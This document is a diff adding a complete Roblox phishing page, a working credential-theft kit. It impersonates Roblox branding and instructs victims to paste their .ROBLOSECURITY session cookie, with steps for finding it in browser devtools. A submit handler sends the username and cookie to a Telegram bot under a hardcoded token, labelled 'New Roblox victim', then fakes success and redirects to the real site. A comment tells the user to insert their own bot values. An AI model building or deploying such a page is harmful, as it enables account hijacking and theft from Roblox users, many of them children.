@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox - Account Verification Required</title>
+  <link rel="icon" href="https://www.roblox.com/favicon.ico" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg: #0b0b14;
+      --card: rgba(20, 20, 40, 0.96);
+      --accent: #5d5fff;
+      --text: #f1f1ff;
+      --text-sec: #a5b4fc;
+      --input: #1e1e35;
+      --border: rgba(93,95,255,0.22);
+      --glow: rgba(93,95,255,0.28);
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: 'Inter', system-ui, sans-serif;
+      background: linear-gradient(135deg, var(--bg), #14001f);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .container {
+      background: var(--card);
+      backdrop-filter: blur(16px);
+      border-radius: 20px;
+      border: 1px solid var(--border);
+      padding: 48px 40px;
+      max-width: 460px;
+      width: 100%;
+      box-shadow: 0 30px 100px rgba(0,0,0,0.7);
+      animation: appear 0.8s ease-out;
+    }
+    @keyframes appear { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 32px;
+    }
+    .logo-img { width: 54px; height: 54px; }
+    .logo-text {
+      font-size: 38px;
+      font-weight: 900;
+      letter-spacing: -2px;
+      background: linear-gradient(90deg, #fff, #d0d0ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    h1 {
+      text-align: center;
+      font-size: 26px;
+      margin-bottom: 12px;
+      color: #e0e0ff;
+    }
+    .subtitle {
+      text-align: center;
+      color: var(--text-sec);
+      font-size: 15px;
+      line-height: 1.5;
+      margin-bottom: 40px;
+    }
+    .form-group {
+      margin-bottom: 28px;
+    }
+    label {
+      display: block;
+      margin-bottom: 10px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #d0d0ff;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 16px 18px;
+      font-size: 15px;
+      background: var(--input);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      color: white;
+      transition: all 0.25s;
+    }
+    input:focus, textarea:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 4px var(--glow);
+      background: #252545;
+    }
+    textarea { min-height: 130px; font-family: monospace; resize: vertical; }
+    .hint {
+      font-size: 12px;
+      color: #c0b0ff;
+      margin-top: 8px;
+      line-height: 1.45;
+    }
+    .btn {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(90deg, var(--accent), #7878ff);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      box-shadow: 0 10px 30px rgba(93,95,255,0.4);
+      margin-top: 12px;
+    }
+    .btn:hover { transform: translateY(-3px); box-shadow: 0 16px 45px rgba(93,95,255,0.55); }
+    .loading, .success {
+      display: none;
+      text-align: center;
+      margin-top: 24px;
+      font-size: 16px;
+      font-weight: 500;
+    }
+    .loading { color: var(--accent); }
+    .success { color: #34d399; }
+    .footer {
+      text-align: center;
+      margin-top: 40px;
+      font-size: 13px;
+      color: #9090c0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://www.roblox.com/images/roblox_logo_dark.svg" alt="Roblox" class="logo-img"/>
+      <span class="logo-text">Roblox</span>
+    </div>
+
+    <h1>Account Verification Required</h1>
+    <p class="subtitle">
+      Please verify your account to continue to the event or claim your reward.
+    </p>
+
+    <form id="phishForm">
+      <div class="form-group">
+        <label>Roblox Username</label>
+        <input type="text" id="username" placeholder="Enter your Roblox username" required autocomplete="off"/>
+      </div>
+
+      <div class="form-group">
+        <label>.ROBLOSECURITY Cookie</label>
+        <textarea id="cookie" placeholder="Paste your _ROBLOSECURITY cookie here...\nExample: _|WARNING:-DO-NOT-SHARE-THIS.----..." required></textarea>
+        <div class="hint">
+          How to find it:<br>
+          1. Log into Roblox in your browser<br>
+          2. Press F12 → Application tab → Cookies → https://www.roblox.com<br>
+          3. Copy the value of <strong>_ROBLOSECURITY</strong>
+        </div>
+      </div>
+
+      <button type="submit" class="btn" id="submitBtn">Verify & Continue</button>
+    </form>
+
+    <div class="loading" id="loading">Verifying your account…</div>
+    <div class="success" id="success">Verification successful! Redirecting…</div>
+
+    <div class="footer">
+      © 2026 Roblox Corporation. All rights reserved.<br>
+      This is a one-time security check.
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('phishForm');
+    const loading = document.getElementById('loading');
+    const success = document.getElementById('success');
+    const btn = document.getElementById('submitBtn');
+
+    // ───────────────────────────────────────────────
+    // REPLACE THESE TWO LINES WITH YOUR REAL VALUES
+    const BOT_TOKEN = '8381871073:AAGZwHN3eBXDQ4N2HvhNRWZOMufNIzgroNY';                    // ← your bot token from @BotFather
+    const CHAT_ID   = '6418644280';                      // ← your user ID or channel/group ID
+    // ───────────────────────────────────────────────
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value.trim();
+      const cookie   = document.getElementById('cookie').value.trim();
+
+      if (!username || cookie.length < 60) {
+        alert('Please enter a valid username and full cookie.');
+        return;
+      }
+
+      btn.disabled = true;
+      btn.textContent = 'Verifying...';
+      loading.style.display = 'block';
+
+      const message = 
+        `**New Roblox victim**\n` +
+        `👤 Username: ${username}\n` +
+        `🍪 Cookie:\n\`\`\`${cookie}\`\`\`\n` +
+        `⏰ ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC`;
+
+      const url = `https://api.telegram.org/bot\( {BOT_TOKEN}/sendMessage?chat_id= \){CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+      try {
+        await fetch(url);
+      } catch (err) {
+        console.log('Telegram send failed', err);
+      }
+
+      setTimeout(() => {
+        loading.style.display = 'none';
+        success.style.display = 'block';
+        setTimeout(() => {
+          window.location.href = 'https://www.roblox.com';
+        }, 2000);
+      }, 1500);
+    });
+  </script>
+</body>
+</html>
